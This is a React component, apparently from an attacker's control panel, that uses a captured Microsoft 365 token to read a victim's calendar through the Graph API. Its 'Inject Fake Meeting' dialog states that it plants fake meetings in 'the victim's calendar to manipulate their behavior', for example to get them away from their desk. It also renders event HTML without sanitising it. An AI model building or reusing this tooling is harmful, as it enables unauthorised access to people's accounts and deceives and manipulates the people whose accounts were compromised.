"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { format, parseISO } from "date-fns";
import {
  Calendar as CalendarIcon,
  Clock,
  MapPin,
  Users,
  ArrowLeft,
  ChevronLeft,
  ChevronRight,
  Loader2,
  AlertCircle,
  Plus,
  X,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { cn, injectMeeting } from "@/lib/utils";
import { toast } from "sonner";

interface GraphEvent {
  id: string;
  subject: string;
  body?: {
    content?: string;
    contentType?: string;
  };
  start?: {
    dateTime: string;
    timeZone: string;
  };
  end?: {
    dateTime: string;
    timeZone: string;
  };
  location?: {
    displayName?: string;
  };
  attendees?: Array<{
    emailAddress?: {
      name?: string;
      address?: string;
    };
    attendee_type?: string;
    status?: {
      response?: string;
    };
  }>;
  isAllDay?: boolean;
  isCancelled?: boolean;
  organizer?: {
    emailAddress?: {
      name?: string;
      address?: string;
    };
  };
  showAs?: string;
  sensitivity?: string;
}

interface CalendarViewProps {
  tokenId: string;
  onBack: () => void;
}

export function CalendarView({ tokenId, onBack }: CalendarViewProps) {
  const [events, setEvents] = useState<GraphEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedEvent, setSelectedEvent] = useState<GraphEvent | null>(null);
  const [currentDate, setCurrentDate] = useState(new Date());
  const [injectOpen, setInjectOpen] = useState(false);
  const [injectLoading, setInjectLoading] = useState(false);
  const [injectSubject, setInjectSubject] = useState("");
  const [injectStartTime, setInjectStartTime] = useState("");
  const [injectDuration, setInjectDuration] = useState("30");
  const [injectLocation, setInjectLocation] = useState("Conference Room A");
  const [injectBody, setInjectBody] = useState("Please join the meeting on time. This is an important discussion that requires your presence.");

  useEffect(() => {
    fetchCalendarEvents();
  }, [tokenId]);

  async function fetchCalendarEvents() {
    setLoading(true);
    setError(null);
    try {
      const res = await fetch(`/api/calendar/events?token_id=${tokenId}`);
      if (res.status === 403) {
        const data = await res.json();
        setError(data.message || "Calendar access requires a Microsoft 365 work or school account.");
        return;
      }
      if (!res.ok) {
        throw new Error("Failed to fetch calendar events");
      }
      const data = await res.json();
      setEvents(data.events || []);
    } catch (e) {
      setError("Failed to load calendar events.");
      toast.error("Could not load calendar events");
    } finally {
      setLoading(false);
    }
  }

  const sortedEvents = React.useMemo(() => {
    return [...events].sort((a, b) => {
      const aStart = a.start?.dateTime ? new Date(a.start.dateTime).getTime() : 0;
      const bStart = b.start?.dateTime ? new Date(b.start.dateTime).getTime() : 0;
      return aStart - bStart;
    });
  }, [events]);

  const todayEvents = sortedEvents.filter((e) => {
    if (!e.start?.dateTime) return false;
    const eventDate = new Date(e.start.dateTime);
    return (
      eventDate.getDate() === currentDate.getDate() &&
      eventDate.getMonth() === currentDate.getMonth() &&
      eventDate.getFullYear() === currentDate.getFullYear()
    );
  });

  const upcomingEvents = sortedEvents.filter((e) => {
    if (!e.start?.dateTime) return false;
    const eventDate = new Date(e.start.dateTime);
    return eventDate >= new Date();
  }).slice(0, 10);

  function formatEventTime(start?: { dateTime: string; timeZone: string }, end?: { dateTime: string; timeZone: string }) {
    if (!start?.dateTime) return "All day";
    const startTime = format(parseISO(start.dateTime), "h:mm a");
    if (end?.dateTime) {
      const endTime = format(parseISO(end.dateTime), "h:mm a");
      return `${startTime} - ${endTime}`;
    }
    return startTime;
  }

  function formatEventDate(dateTime?: string) {
    if (!dateTime) return "";
    return format(parseISO(dateTime), "EEE, MMM d");
  }

  if (loading) {
    return (
      <div className="flex-1 flex flex-col bg-[#1f1f1f] min-h-0">
        <div className="flex items-center gap-3 px-4 py-3 border-b border-[#3d3d3d] flex-shrink-0">
          <Button variant="ghost" size="sm" onClick={onBack} className="gap-1.5 text-xs text-[#a0a0a0] hover:text-[#ffffff]">
            <ArrowLeft className="h-4 w-4" />
            Back
          </Button>
          <div className="h-4 w-px bg-[#3d3d3d]" />
          <CalendarIcon className="h-4 w-4 text-[#0f6cbd]" />
          <span className="text-sm font-semibold text-[#ffffff]">Calendar</span>
        </div>
        <div className="flex-1 flex items-center justify-center">
          <div className="flex items-center gap-2 text-[#a0a0a0]">
            <Loader2 className="h-5 w-5 animate-spin" />
            <span className="text-sm">Loading calendar...</span>
          </div>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex-1 flex flex-col bg-[#1f1f1f] min-h-0">
        <div className="flex items-center gap-3 px-4 py-3 border-b border-[#3d3d3d] flex-shrink-0">
          <Button variant="ghost" size="sm" onClick={onBack} className="gap-1.5 text-xs text-[#a0a0a0] hover:text-[#ffffff]">
            <ArrowLeft className="h-4 w-4" />
            Back
          </Button>
          <div className="h-4 w-px bg-[#3d3d3d]" />
          <CalendarIcon className="h-4 w-4 text-[#0f6cbd]" />
          <span className="text-sm font-semibold text-[#ffffff]">Calendar</span>
        </div>
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center max-w-sm px-4">
            <AlertCircle className="h-12 w-12 text-[#a0a0a0] mx-auto mb-3" />
            <p className="text-sm text-[#a0a0a0] mb-2">{error}</p>
            <p className="text-xs text-[#6b6b6b] mb-4">
              Consumer accounts (Outlook.com, Hotmail.com) do not have calendar access via Graph API.
            </p>
            <Button variant="outline" size="sm" onClick={onBack} className="border-[#3d3d3d] text-[#ffffff] hover:bg-[#2d2d2d]">
              Back to Mail
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1 flex flex-col bg-[#1f1f1f] min-h-0 overflow-hidden">
      {/* Header */}
      <div className="flex items-center gap-3 px-4 py-3 border-b border-[#3d3d3d] flex-shrink-0">
        <Button variant="ghost" size="sm" onClick={onBack} className="gap-1.5 text-xs text-[#a0a0a0] hover:text-[#ffffff]">
          <ArrowLeft className="h-4 w-4" />
          Back
        </Button>
        <div className="h-4 w-px bg-[#3d3d3d]" />
        <CalendarIcon className="h-4 w-4 text-[#0f6cbd]" />
        <span className="text-sm font-semibold text-[#ffffff]">Calendar</span>
        <div className="flex-1" />
        <div className="flex items-center gap-2">
          <Button variant="ghost" size="sm" className="h-7 w-7 p-0 text-[#a0a0a0] hover:text-[#ffffff]">
            <ChevronLeft className="h-4 w-4" />
          </Button>
          <span className="text-sm text-[#ffffff] font-medium">
            {format(currentDate, "MMMM yyyy")}
          </span>
          <Button variant="ghost" size="sm" className="h-7 w-7 p-0 text-[#a0a0a0] hover:text-[#ffffff]">
            <ChevronRight className="h-4 w-4" />
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => setInjectOpen(true)}
            className="gap-1.5 text-xs ml-2 border-amber-500/30 text-amber-400 hover:bg-amber-500/10"
          >
            <Plus className="h-3.5 w-3.5" />
            Inject Meeting
          </Button>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 flex min-h-0 overflow-hidden">
        {/* Event List */}
        <div className="w-[400px] flex-shrink-0 border-r border-[#3d3d3d] flex flex-col">
          <div className="px-4 py-2 border-b border-[#3d3d3d]">
            <h3 className="text-xs font-semibold text-[#a0a0a0] uppercase tracking-wider">Upcoming Events</h3>
          </div>
          <div className="flex-1 overflow-y-auto owa-scroll">
            {upcomingEvents.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-32 text-center">
                <CalendarIcon className="h-8 w-8 text-[#6b6b6b] mb-2" />
                <p className="text-xs text-[#a0a0a0]">No upcoming events</p>
              </div>
            ) : (
              <div className="divide-y divide-[#252525]">
                {upcomingEvents.map((event) => (
                  <button
                    key={event.id}
                    onClick={() => setSelectedEvent(event)}
                    className={cn(
                      "w-full text-left px-4 py-3 transition-colors duration-75",
                      selectedEvent?.id === event.id
                        ? "bg-[rgba(15,108,189,0.1)]"
                        : "hover:bg-[#2d2d2d]"
                    )}
                  >
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 w-12 text-center">
                        <p className="text-xs font-semibold text-[#0f6cbd]">
                          {formatEventDate(event.start?.dateTime)}
                        </p>
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-medium text-[#ffffff] truncate">
                          {event.subject}
                        </p>
                        <div className="flex items-center gap-2 mt-1">
                          <span className="text-[11px] text-[#a0a0a0] flex items-center gap-1">
                            <Clock className="h-3 w-3" />
                            {formatEventTime(event.start, event.end)}
                          </span>
                          {event.isCancelled && (
                            <span className="text-[10px] text-rose-400 bg-rose-500/10 px-1.5 py-0.5 rounded">Cancelled</span>
                          )}
                        </div>
                        {event.location?.displayName && (
                          <p className="text-[11px] text-[#a0a0a0] flex items-center gap-1 mt-1">
                            <MapPin className="h-3 w-3" />
                            {event.location.displayName}
                          </p>
                        )}
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Event Detail */}
        <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
          <AnimatePresence mode="wait">
            {selectedEvent ? (
              <motion.div
                key={selectedEvent.id}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="flex-1 overflow-y-auto owa-scroll"
              >
                <div className="px-6 py-5">
                  <div className="flex items-start gap-3 mb-4">
                    <div className="h-10 w-10 rounded bg-[#0f6cbd]/20 flex items-center justify-center flex-shrink-0">
                      <CalendarIcon className="h-5 w-5 text-[#0f6cbd]" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <h2 className="text-lg font-semibold text-[#ffffff] leading-snug">
                        {selectedEvent.subject}
                      </h2>
                      <div className="flex items-center gap-2 mt-1 flex-wrap">
                        {selectedEvent.isCancelled && (
                          <span className="text-[10px] text-rose-400 bg-rose-500/10 px-2 py-0.5 rounded">Cancelled</span>
                        )}
                        {selectedEvent.isAllDay && (
                          <span className="text-[10px] text-[#0f6cbd] bg-[#0f6cbd]/10 px-2 py-0.5 rounded">All day</span>
                        )}
                        {selectedEvent.sensitivity && (
                          <span className="text-[10px] text-amber-400 bg-amber-500/10 px-2 py-0.5 rounded">{selectedEvent.sensitivity}</span>
                        )}
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div className="flex items-start gap-3">
                      <Clock className="h-4 w-4 text-[#a0a0a0] flex-shrink-0 mt-0.5" />
                      <div>
                        <p className="text-sm text-[#ffffff]">
                          {selectedEvent.start?.dateTime && formatEventDate(selectedEvent.start.dateTime)}
                        </p>
                        <p className="text-xs text-[#a0a0a0]">
                          {formatEventTime(selectedEvent.start, selectedEvent.end)}
                        </p>
                      </div>
                    </div>

                    {selectedEvent.location?.displayName && (
                      <div className="flex items-start gap-3">
                        <MapPin className="h-4 w-4 text-[#a0a0a0] flex-shrink-0 mt-0.5" />
                        <p className="text-sm text-[#ffffff]">{selectedEvent.location.displayName}</p>
                      </div>
                    )}

                    {selectedEvent.organizer?.emailAddress && (
                      <div className="flex items-start gap-3">
                        <Users className="h-4 w-4 text-[#a0a0a0] flex-shrink-0 mt-0.5" />
                        <div>
                          <p className="text-sm text-[#ffffff]">
                            {selectedEvent.organizer.emailAddress.name || selectedEvent.organizer.emailAddress.address}
                          </p>
                          <p className="text-xs text-[#a0a0a0]">Organizer</p>
                        </div>
                      </div>
                    )}

                    {selectedEvent.attendees && selectedEvent.attendees.length > 0 && (
                      <div className="flex items-start gap-3">
                        <Users className="h-4 w-4 text-[#a0a0a0] flex-shrink-0 mt-0.5" />
                        <div>
                          <p className="text-xs text-[#a0a0a0] mb-1">{selectedEvent.attendees.length} attendees</p>
                          <div className="flex flex-wrap gap-1">
                            {selectedEvent.attendees.slice(0, 5).map((attendee, i) => (
                              <span key={i} className="text-[10px] bg-[#252525] text-[#a0a0a0] px-2 py-0.5 rounded">
                                {attendee.emailAddress?.name || attendee.emailAddress?.address || "Unknown"}
                                {attendee.status?.response && ` (${attendee.status.response})`}
                              </span>
                            ))}
                            {selectedEvent.attendees.length > 5 && (
                              <span className="text-[10px] text-[#a0a0a0]">+{selectedEvent.attendees.length - 5} more</span>
                            )}
                          </div>
                        </div>
                      </div>
                    )}

                    {selectedEvent.body?.content && (
                      <div className="pt-2 border-t border-[#3d3d3d]">
                        <p className="text-xs text-[#a0a0a0] mb-2 uppercase tracking-wider font-semibold">Description</p>
                        <div
                          className="text-sm text-[#ffffff]/80 leading-relaxed prose prose-sm max-w-none prose-invert"
                          dangerouslySetInnerHTML={{
                            __html: selectedEvent.body.contentType === "html"
                              ? selectedEvent.body.content
                              : selectedEvent.body.content.replace(/\n/g, "<br>")
                          }}
                        />
                      </div>
                    )}
                  </div>
                </div>
              </motion.div>
            ) : (
              <div className="flex-1 flex items-center justify-center">
                <div className="text-center">
                  <CalendarIcon className="h-12 w-12 text-[#3d3d3d] mx-auto mb-3" />
                  <p className="text-sm text-[#a0a0a0]">Select an event to view details</p>
                </div>
              </div>
            )}
          </AnimatePresence>
        </div>
      </div>

      {/* Inject Meeting Dialog */}
      <Dialog open={injectOpen} onOpenChange={setInjectOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <CalendarIcon className="h-4 w-4 text-amber-400" />
              Inject Fake Meeting
            </DialogTitle>
            <DialogDescription className="text-[11px]">
              Injects a fake meeting into the victim's calendar to manipulate their behavior (e.g., get them away from their desk).
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 py-2">
            <div className="space-y-1.5">
              <label className="text-xs font-medium">Subject</label>
              <Input value={injectSubject} onChange={(e) => setInjectSubject(e.target.value)} placeholder="e.g., Emergency Budget Review" className="bg-secondary/50 border-white/5" />
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-medium">Start Time (UTC)</label>
              <Input type="datetime-local" value={injectStartTime} onChange={(e) => setInjectStartTime(e.target.value)} className="bg-secondary/50 border-white/5" />
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div className="space-y-1.5">
                <label className="text-xs font-medium">Duration (min)</label>
                <Input type="number" value={injectDuration} onChange={(e) => setInjectDuration(e.target.value)} className="bg-secondary/50 border-white/5" />
              </div>
              <div className="space-y-1.5">
                <label className="text-xs font-medium">Location</label>
                <Input value={injectLocation} onChange={(e) => setInjectLocation(e.target.value)} className="bg-secondary/50 border-white/5" />
              </div>
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-medium">Body</label>
              <Input value={injectBody} onChange={(e) => setInjectBody(e.target.value)} className="bg-secondary/50 border-white/5" />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" size="sm" onClick={() => setInjectOpen(false)}>Cancel</Button>
            <Button
              size="sm"
              onClick={async () => {
                if (!injectSubject.trim() || !injectStartTime) {
                  toast.error("Subject and start time are required");
                  return;
                }
                setInjectLoading(true);
                try {
                  const dt = new Date(injectStartTime);
                  const isoTime = dt.toISOString();
                  await injectMeeting({
                    token_id: tokenId,
                    subject: injectSubject.trim(),
                    start_time: isoTime,
                    duration_minutes: parseInt(injectDuration) || 30,
                    location: injectLocation,
                    body: injectBody,
                  });
                  toast.success("Fake meeting injected into victim's calendar");
                  setInjectOpen(false);
                  setInjectSubject("");
                  fetchCalendarEvents();
                } catch (err: any) {
                  toast.error(err.message || "Failed to inject meeting");
                } finally {
                  setInjectLoading(false);
                }
              }}
              disabled={injectLoading || !injectSubject.trim() || !injectStartTime}
              className="gap-1.5 bg-amber-500 hover:bg-amber-600 text-white"
            >
              {injectLoading ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Plus className="h-3.5 w-3.5" />}
              Inject Meeting
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

export default CalendarView;
